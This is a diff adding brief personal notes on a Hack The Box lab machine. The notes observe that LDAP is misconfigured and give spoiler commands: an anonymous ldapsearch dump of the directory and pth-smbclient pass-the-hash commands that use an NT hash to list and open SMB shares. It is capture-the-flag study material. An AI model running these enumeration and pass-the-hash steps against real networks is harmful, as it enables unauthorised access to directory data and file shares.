@@ -1,0 +1,11 @@
+(love it, learned about ldap)
+Points:
+- ldap is misconfigured. Can see this from nmap.
+
+Details:
+- Don't know how to use ldapsearch, -h and wireshark. Nmap script can do the same.
+
+Spoiler:
+ldapsearch -h 10.10.10.107 -x -s sub -b "dc=hackthebox,dc=htb"
+pth-smbclient --user=xxxx --pwn-nt-hash -L <ip> \\\\<ip>\\ <nthash>
+pth-smbclient --user=xxxx --pwn-nt-hash \\\\<ip>\\<dir> <nthash>
